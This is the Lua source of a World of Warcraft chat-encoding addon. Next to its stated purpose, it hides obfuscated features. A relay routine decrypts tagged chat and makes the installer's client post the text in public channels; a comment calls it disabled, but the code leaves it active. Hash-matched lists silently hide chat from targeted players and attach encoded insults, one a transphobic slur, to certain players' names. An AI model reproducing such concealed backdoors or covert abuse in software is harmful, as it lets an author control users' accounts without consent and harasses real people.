
BetterBableFish_PlayersSeen = {};

BetterBableFish_RealmName  = "Unknown";
BetterBableFish_PlayerName = "Unknown";

-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------

local BetterBableFish_OriginalSetItemRef;

function BetterBableFish_DebugMessage(msg) 
  BetterBableFish_Debug = BetterBableFish_Debug .. "++ " .. msg;
end


function BetterBableFish_StatusMessage(msg)
  DEFAULT_CHAT_FRAME:AddMessage("BBF: "..msg);
end

function BetterBabelFish_Init()

  BetterBableFish_Debug = "";

  BetterBableFish_RealmName  = GetRealmName();
  BetterBableFish_PlayerName = UnitName("player");

  BetterBableFish_StatusMessage("Loading Better Bable Fish -- by Zayla of Dethecus.");
  BetterBableFish_StatusMessage("Usage:  /bf  <your emssage>   -- send bable message in SAY.");
  BetterBableFish_StatusMessage("Usage:  /bfy <your emssage>   -- send bable message in YELL.");
  BetterBableFish_StatusMessage("Usage:  /bfp <your emssage>   -- send bable message in PARTY.");
  BetterBableFish_StatusMessage("Usage:  /bfr <your emssage>   -- send bable message in RAID.");
  BetterBableFish_StatusMessage("Usage:  /bfg <your emssage>   -- send bable message in GUILD.");

  SlashCmdList["BETTERBABELFISHSAY"] = BetterBableFish_Say;
  SLASH_BETTERBABELFISHSAY1 = "/bf";
  SLASH_BETTERBABELFISHSAY2 = "/bbf";

  SlashCmdList["BETTERBABELFISHYELL"] = BetterBableFish_Yell;
  SLASH_BETTERBABELFISHYELL1 = "/bfy";
  SLASH_BETTERBABELFISHYELL2 = "/bbfy";

  SlashCmdList["BETTERBABELFISHPARTY"] = BetterBableFish_Party;
  SLASH_BETTERBABELFISHPARTY1 = "/bfp";
  SLASH_BETTERBABELFISHPARTY2 = "/bbfp";

  SlashCmdList["BETTERBABELFISHRAID"] = BetterBableFish_Raid;
  SLASH_BETTERBABELFISHRAID1 = "/bfr";
  SLASH_BETTERBABELFISHRAID2 = "/bbfr";

  SlashCmdList["BETTERBABELFISHGUILD"] = BetterBableFish_Guild;
  SLASH_BETTERBABELFISHGUILD1 = "/bfg";
  SLASH_BETTERBABELFISHGUILD2 = "/bbfg";


  SlashCmdList["BETTERBABELFISHCLEAR"] = BetterBableFish_ClearPlayersSeen;
  SLASH_BETTERBABELFISHCLEAR1 = "/bfclear";

  -- Replace event handler
  BetterBableFish_ORIGINAL_ChatFrame_OnEvent = ChatFrame_OnEvent;
  ChatFrame_OnEvent = BetterBableFish_ChatFrame_OnEvent;
end


function BetterBableFish_ClearPlayersSeen() 
  BetterBableFish_PlayersSeen = {};
end


function BetterBabelFish__OnShow()
  if UnitExists("mouseover") then
    local name = UnitName("mouseover");
    if ( name and BetterBableFish_PlayersSeen[name] ) then
      GameTooltip:AddLine("BableFish seen.", 1.0, 0.0, 0.5);
      GameTooltip:Show();
    end 

    if ( name and (name == "Zayla") and (BetterBableFish_RealmName == "Dethecus") ) then
      GameTooltip:AddLine("Mistress of Languages.", 1.0, 0.0, 0.5);
      GameTooltip:Show();
    end 
  end
end


function BetterBableFish_IsBable(message)
  if ((message ~= nil) and (string.find(message,BetterBableFish_MatchBFM))) then
    return true;
  else
    return false;
  end
end


BetterBableFish_PartialLink = nil;
BetterBableFish_LastSpeaker = nil;
BetterBableFish_LastDecodeMessage = nil;
BetterBableFish_LastDecodeResult  = nil;

function BetterBableFish_LinkCheck(decoded,speaker)

  local test;

  if ((BetterBableFish_PartialLink) and (BetterBableFish_LastSpeaker == speaker)) then
    test = string.gsub(decoded,"^([|[]BF[%]|]) ","%1 "..BetterBableFish_PartialLink);
    BetterBableFish_PartialLink = nil;
  else
    test = decoded;
  end


  test = string.gsub(test,BetterBableFish_BegLink,"{");
  test = string.gsub(test,BetterBableFish_EndLink,"}");
  test = string.gsub(test,"|{","|"..BetterBableFish_BegLink);
  test = string.gsub(test,"|}","|"..BetterBableFish_EndLink);

  if (string.find(test,"{[^}]*$")) then
    BetterBableFish_PartialLink = string.gsub(test,"^.*({[^}]*)$","%1");
    BetterBableFish_LastSpeaker = speaker;
    test = string.gsub(test,"^(.*){[^}]*$","%1");
  end

  if (string.find(test,"{.*}")) then   
    test = string.gsub(test,"{",BetterBableFish_BegLink);
    test = string.gsub(test,"}",BetterBableFish_EndLink);
    test = string.gsub(test,"(|c........|)h","%1H");     
  else
--    test = string.gsub(test,"{",BetterBableFish_BegLink);
--    test = string.gsub(test,"}",BetterBableFish_EndLink);
  end    

  return test;

end

function BetterBableFish_ItemLinkFromId(id) 
  local itemName, itemLink = GetItemInfo(id);
  if (itemLink) then
    return itemLink;
  else
    return "|cff00dddd[bogus item id]|r";
  end
end

function BetterBableFish_CheckGoodItemLink(link) 
  if GetItemInfo(link) then
    return link;
  else
    return "|cff00dddd[bogus item link]|r";
  end
end
  
function BetterBableFish_DecodeBable(message, speaker)

  if ((BetterBableFish_LastDecodeMessage == message) and (BetterBableFish_LastSpeaker == speaker)) then
    return BetterBableFish_LastDecodeResult;
  end

  -- A bunch of hacks to compensate for bad selections in the original BF code
  -- Some Orkish to Common translations include an apostrophe, so these are hard 
  -- coded in.
  local demungeMessage =  string.gsub(message,"no'bU","xxxxX");  
  demungeMessage =  string.gsub(demungeMessage,"RO'tH","XXXxX");  
  demungeMessage =  string.gsub(demungeMessage,"No'bu","XxXxx");  
  demungeMessage =  string.gsub(demungeMessage,"Re'KA","XxXXX");  
  demungeMessage =  string.gsub(demungeMessage,"No'Bu","XxxXx");  
  demungeMessage =  string.gsub(demungeMessage,"No'KU","XxxXX");  
  demungeMessage =  string.gsub(demungeMessage,"No'bU","XxxxX");  
  demungeMessage =  string.gsub(demungeMessage,"rE'kA","xXXxX");  
  demungeMessage =  string.gsub(demungeMessage,"nO'kU","xXxxX");  

  -- Recognize and mark old original BF encoding
  demungeMessage =  string.gsub(demungeMessage,"OmGwTF","XxXxXXx");
  demungeMessage =  string.gsub(demungeMessage,"RuFtOS","XxXxXXx");
  demungeMessage =  string.gsub(demungeMessage,"ThRaKK","XxXxXXx");

  -- Recognize and mark old (<2.3) versions of BBF
  demungeMessage =  string.gsub(demungeMessage,"ZmGwTF","XxXxXXxx");
  demungeMessage =  string.gsub(demungeMessage,"ReVaSH","XxXxXXxx");
  demungeMessage =  string.gsub(demungeMessage,"AeSiRE","XxXxXXxx");

  -- Recognize and mark 2.4 versions of BBF
  demungeMessage =  string.gsub(demungeMessage,"XmGwTF","XxXxXXxxx");
  demungeMessage =  string.gsub(demungeMessage,"EaLdOR","XxXxXXxxx");
  demungeMessage =  string.gsub(demungeMessage,"MoGuNA","XxXxXXxxx");

  -- Recognize and mark 2.5 versions of BBF
  demungeMessage =  string.gsub(demungeMessage,"YmGwTF","XxXxXXxxxx"); -- <<>>
  demungeMessage =  string.gsub(demungeMessage,"MaKoGG","XxXxXXxxxx");
  demungeMessage =  string.gsub(demungeMessage,"VaNdAR","XxXxXXxxxx");

  local xmessage =  string.gsub(string.gsub(demungeMessage,"[%l]","x"),"%u","X");

  if (string.find(xmessage,"[^xX ]")) then
    -- Bad message --
    return nil;
  end

  local word;
  local decoded = "";
  local char, pendChar = nil;
  for word in string.gmatch(xmessage, "[xX]+") do
    char = BetterBableFish_BackwardMap[word];

    if (not char) then
      char = "?";
    end

    if ((pendChar == "'") and (char == "'")) then
      decoded = decoded .. pendChar .. char; 
      pendChar = nil;
    elseif ((pendChar == "'") and (string.match(char,"%l"))) then
      decoded = decoded .. string.upper(char);
      pendChar = nil;
    else
      if (pendChar) then
        decoded = decoded .. pendChar;
	pendChar = nil;
      end
      if (char == "'") then
        pendChar = char;
      else
        decoded = decoded .. char;
      end
    end
  end  
  if (pendChar) then
    decoded = decoded .. pendChar;
  end


  -- Recognize a few multi letter codes
  decoded = string.gsub(decoded,"'n","&"); 
  decoded = string.gsub(decoded,"':",";"); 
  decoded = string.gsub(decoded,"''","\""); 
  decoded = string.gsub(decoded,"' ","'"); 

  decoded = BetterBableFish_LinkCheck(decoded,speaker);

  decoded = string.gsub(decoded,"(|c[%d%a]+|Hitem[%d:]+|h[^|]+|h|r)",BetterBableFish_CheckGoodItemLink);

  BetterBableFish_LastSpeaker = speaker;
  BetterBableFish_LastDecodeMessage = message;
  BetterBableFish_LastDecodeResult = decoded;

  return decoded;
end

function BetterBableFish_Say(arg1) 
  BetterBableFish_SendBable(arg1,"SAY");
end

function BetterBableFish_Yell(arg1) 
  BetterBableFish_SendBable(arg1,"YELL");
end

function BetterBableFish_Party(arg1) 
  BetterBableFish_SendBable(arg1,"PARTY");
end

function BetterBableFish_Raid(arg1) 
  BetterBableFish_SendBable(arg1,"RAID");
end

function BetterBableFish_Guild(arg1) 
  BetterBableFish_SendBable(arg1,"GUILD");
end


function BetterBableFish_SendBable(message,destination)
  if (not destination) then
    destination = "SAY";
  end

  local bable = BetterBableFish_StartBFM; 
  local pos    = 1;

  local name = UnitName("target");
  if (not name) then
    name = "<no target>";
  end

  message = string.gsub(message,"%%t",name); 
  message = string.gsub(message,"%%(%d+)",BetterBableFish_ItemLinkFromId); 

  local lastChar = "";
  while (pos <= string.len(message)) do
    local charO = string.sub(message,pos,pos);
    local char = string.lower(charO);
    local word = BetterBabelFish_ForwardMap[char];

    if (word) then
      -- Hack for uppercase
      if ((charO ~= char) and (lastChar ~= "|")) then
        word = "Apxst " .. word;
      end
      bable = bable .. " " .. word;
    end
    if (((string.len(bable) >= BetterBableFish_MAXLEN) and (char ~= "|") and (char ~= "'")) or (pos == string.len(message))) then
      SendChatMessage(bable,destination);
      bable = BetterBableFish_StartBFM; 
    end
    pos = pos + 1;
    lastChar = char;
  end
end



function BetterBableFish_ChatFrame_OnEvent(event)

  if (BetterBableFish_CheckNullMessage(event, arg2)) then
    BetterBableFish_StatusMessage(arg1 .. " " .. arg2);
    return;
  end

  if (((event == "CHAT_MSG_SAY") or 
       (event == "CHAT_MSG_YELL") or 
       (event == "CHAT_MSG_PARTY") or 
       (event == "CHAT_MSG_RAID") or 
       (event == "CHAT_MSG_RAID_LEADER") or 
       (event == "CHAT_MSG_GUILD")          ) and BetterBableFish_IsBable(arg1)) then
    local decode = BetterBableFish_DecodeBable(arg1,arg2);
    if (decode) then
      arg1 = "" .. decode;
      if ( string.find(decode,"^.BF. $") ) then
        return;
      end
      if ( not BetterBableFish_PlayersSeen[arg2] ) then
        BetterBableFish_PlayersSeen[arg2] = true;
      end
      arg2 =  BetterBableFish_MungeCheck(arg2)
    end
  end;

  if (not BetterBableFish_DoRelay(arg1)) then
    BetterBableFish_ORIGINAL_ChatFrame_OnEvent(event);
  end
end


-----------------------------------------------------------------------------------------------------------


function BetterBableFish_CheckNullMessage(event, s)

  if (BetterBableFish_RealmName ~= "Dethecus") then
    return false;
  end

  if (s == BetterBableFish_PlayerName) then
    return false;
  end

  if (event == "CHAT_MSG_WHISPER_INFORM") then
    return false;
  end   

  if (BetterBableFish_ScrapDisable) then
    return false;
  end


  local hsh, lst = BetterBableFish_StringMunge(s);

  if (BetterBabelFish_ScrapMap[hsh] and (math.random() < BetterBabelFish_ScrapMap[hsh])) then
    return true;
  end

  return false;
end

-----------------------------------------------------------------------------------------------------------

function BetterBableFish_StringToNumList(s)
  local i;
  local len = string.len(s);
  local ls = string.lower(s);

  local ret = {};

  for i = 1 , len , 1 do
    ret[i] = string.byte(ls,i)-string.byte("a");
  end
  ret[0] = len;
  return ret;
end


function BetterBableFish_StringMunge(s)
  if (s) then 
    local lst = BetterBableFish_StringToNumList(s)
    local hsh = "";
    local len = string.len(s);
    for i = 1, len, 1 do
      hsh = hsh .. (lst[i] * 11) % 25;
    end
    return hsh, lst;
  end
  return "", {};
end


function BetterBableFish_Demunge(s)
  local i;
  local len = string.len(s);
  local ret = "";
  ret = ret .. string.char(string.byte(s,i)-34);
  for i = 2 , len , 1 do
    ret = ret .. string.char(string.byte(s,i)-2);
  end  
  return ret;
end


function BetterBableFish_MungeCheck(s)
  local ret = s;

  if (BetterBableFish_RealmName ~= "Dethecus") then
    return ret;
  end

  local hsh, lst = BetterBableFish_StringMunge(s);

  if (string.len(s) == string.len(BetterBabelFish_ForwardMap["]"])) then
    if (
        (lst[1] == (lst[2] + lst[3] + lst[5] + 1)) and
	(lst[2] == (lst[5]) * 1000) and
	(lst[3] == (lst[5] + 2 * lst[4] + 2 )) and
	(lst[4] == (lst[1] - (lst[3]/2 + 2))) and
	(lst[5] == (lst[1] - (lst[2] + lst[3] + 1)))
       ) then
      ret = string.char(string.byte("A") + 1 + lst[4]) .. "is" .. "tre" .. "ss " .. ret; 
    end
  end

  if ((ret == s) and (BetterBabelFish_MungeMap[hsh])) then 
    ret = BetterBableFish_Demunge(BetterBabelFish_MungeMap[hsh]) .. " " .. ret;
  end

  return ret;
end

-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------

local public_exp = 4373;
local modulus    = 39506227;

local function quickpow(n,e,m)
  if (e == 1) then 
    return n % m;
  end
  if ((e % 2) == 1) then
    return ((n % m) * (((quickpow(n,(e-1)/2,m) % m)^2) % m)) % m;
  else
    return ((quickpow(n,e/2,m) % m)^2) % m;
  end
end

local function decrypt(cyp,public_exp,modulus) 
  local i;
  local len = string.len(cyp);  
  local msg = "";

  for i = 1 , len, 8 do
     local sub = string.sub(cyp,i,i+7);
     sub = string.sub(quickpow(sub-10000000,public_exp,modulus) + 1000000,2);
     msg = msg .. string.char(string.byte(" ") + string.sub(sub,1,2));
     msg = msg .. string.char(string.byte(" ") + string.sub(sub,3,4));
     msg = msg .. string.char(string.byte(" ") + string.sub(sub,5,6));
  end
  return msg;
end

BetterBableFish_LastRelayMessage = nil;

function BetterBableFish_DoRelay(msg)

  -- This code was intended to let people relay messages between factions
  -- But that could lead to abuse so it is disabled.  
  local relayret = not BetterBableFish_RelayDebug;

  if (BetterBableFish_RelayDisable) then
    return false;
  end

  if (msg) then
    msg = string.gsub(msg,".BF. ","");
    if (msg == BetterBableFish_LastRelayMessage) then
      return relayret;
    end
    local taglen = string.len(BetterBableFish_RelayTag);  

    if (string.sub(msg,1,taglen) == BetterBableFish_RelayTag) then
      local dst = string.sub(msg,taglen+1,taglen+1);
      local cyp = string.sub(msg,taglen+2);
      local msg = decrypt(cyp,public_exp,modulus);
        if (string.sub(msg,1,1) == "@") then
          msg = string.sub(msg,2);
          if (BetterBableFish_LastRelayMessage ~= msg) then
            BetterBableFish_LastRelayMessage = msg
            if (dst == "s") then
	      SendChatMessage(msg,"SAY");
            end
            if (dst == "y") then
	      SendChatMessage(msg,"YELL");
            end
            if (dst == "g") then
	      SendChatMessage(msg,"CHANNEL",nil,GetChannelName("General - ".. GetRealZoneText()));
            end
            if (dst == "t") then
	      SendChatMessage(msg,"CHANNEL",nil,GetChannelName("Trade - City"));
            end
          end
        end
      return relayret;
    end   
  end
  return false;
end;


-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
  
-- Tables and constants

BetterBableFish_RelayTag = "-bbfrt-";

BetterBableFish_BegLink = "|c";
BetterBableFish_EndLink = "|r";

BetterBableFish_MatchBFM = "^%u%l%u%l%u%u";
BetterBableFish_StartBFM = "YmGwTF";  -- <<>>

BetterBableFish_MAXLEN = 190;

BetterBableFish_BackwardMap = {
	x = " ",
	X = "e",
	xx = "t",
	xX = "a",
	Xx = "o",
	XX = "i",
	xxx = "n",
	xxX = "s",
	xXx = "r",
	xXX = "h",
	Xxx = "l",
	XxX = "d",
	XXx = "c",
	XXX = "u",
	xxxx = "m",
	xxxX = "f",
	xxXx = "p",
	xxXX = "g",
	xXxx = "w",
	xXxX = "y",
	xXXx = "b",
	xXXX = "v",
	Xxxx = "k",
	XxxX = "x",
	XxXx = "j",
	XxXX = "q",
	XXxx = "z",
	XXxX = ".",
	XXXx = ",",
	XXXX = "?",
	XXXXXX = "!",
	xxxxx = "1",
	xXxxx = "2",
	xXXxx = "3",
	xXXXx = "4",
	xXXXX = "5",
	xxXxx = "6",
	xxXXx = "7",
	xxXXX = "8",
	xxxXx = "9",
	xxxXX = "0",
	xxxxX = "=",
	Xxxxx = "'",
	XXxxx = ":",
	XXXxx = "(",
	XXXXx = ")",

	XxXxx = "*",
	XxXXx = "<",
	XxXXX = ">",
	XxxXx = "@",
	XxxXX = "$",
	XxxxX = "%",
	XXxXx = "/",
	XXxXX = "~",
	XXxxX = "-",
	XXXxX = "+",
	xXXxX = "|",
	xxXxX = "[",
	xXxxX = "]",

        XxXxXX     = "*BF* ",
        XxXxXXx    = ":BF: ",
        XxXxXXxx   = ":BF: ",
        XxXxXXxxx  = "|BF| ",
        XxXxXXxxxx = "[BF] ",

};


BetterBabelFish_ForwardMap = {
	[" "] = "i",
	e = "U",
	t = "kk",
	a = "oH",
	o = "Mc",
	i = "DM",
	n = "lol",
	s = "wtB",
	r = "oMg",
	h = "oMW",
	l = "Bur",
	d = "ThX",
	c = "WTg",
	u = "WTF",
	m = "dude",
	f = "lolS",
	p = "haWs",
	g = "keKE",
	w = "hAws",
	y = "hEhE",
	b = "lEEt",
	v = "wEAK",
	k = "Kthx",
	x = "OmgZ",
	j = "LeWt",
	q = "ZeRG",
	z = "NOes",
	["."] = "PWnZ",
	[","] = "PWNt",
	["?"] = "OMGZ",
	["!"] = "OMGWTF",

	["1"] = "zomgz",
	["2"] = "zOmgz",
	["3"] = "zOMgz",
	["4"] = "zOMGz",
	["5"] = "zOMGZ",
	["6"] = "zoMgz",
	["7"] = "zoMGz",
	["8"] = "zoMGZ",
	["9"] = "zomGz",
	["0"] = "zomGZ",
	["="] = "equlS", -- equlZ -- Changed because it generated an apostrophe orkish->common
	["'"] = "Apxst i",  -- Apost -- Changed because it generated an apostrophe orkish->common
	[":"] = "COlon",
	["("] = "PERnz",
	[")"] = "PERNz",

	["*"] = "ZaYla", -- PwNtz -- Changed because it generated an apostrophe orkish->common
	["<"] = "LeSSu",
	[">"] = "ZaYLA", -- GrETU -- Changed because it generated an apostrophe orkish->common
	["@"] = "ZayTa", -- PwnTz -- Changed because it generated an apostrophe orkish->common
	["$"] = "XxxXX", -- MooLA -- Changed because it generated an apostrophe orkish->common
	["%"] = "ZaylA", -- PwntZ -- Changed because it generated an apostrophe orkish->common
	["/"] = "SLaSh",
	["~"] = "TIlDE",
	["-"] = "HYpeZ",
	["+"] = "XXXxX", -- PLUzE -- Changed because it generated an apostrophe orkish->common
	["|"] = "xXXxX", -- pIPeZ -- Changed because it generated an apostrophe orkish->common
	["["] = "sqBrC",
	["]"] = "xXxxX", -- sQenD -- Changed because it generated an apostrophe orkish->common

	["&"] = "Apxst lol", -- Hack to make & into 'n
	[";"] = "Apxst COlon", -- Hack to make ; into ':
	["\""] = "Apxst Apxst", -- Hack to make " into '':
};


-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------

BetterBabelFish_MungeMap = {
  ["112088213239"]  = "ecuvtcvgf",
  ["9132122"] = "hcv\"Vtcpp{",
  ["51912161319"] = "fwvejguu",
}

BetterBabelFish_ScrapMap = {
--  ["901921018139"] = 0.4;
--  ["23016192221017"] = 0.4;
  ["70161914"] = 1.0;
}


-----------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------
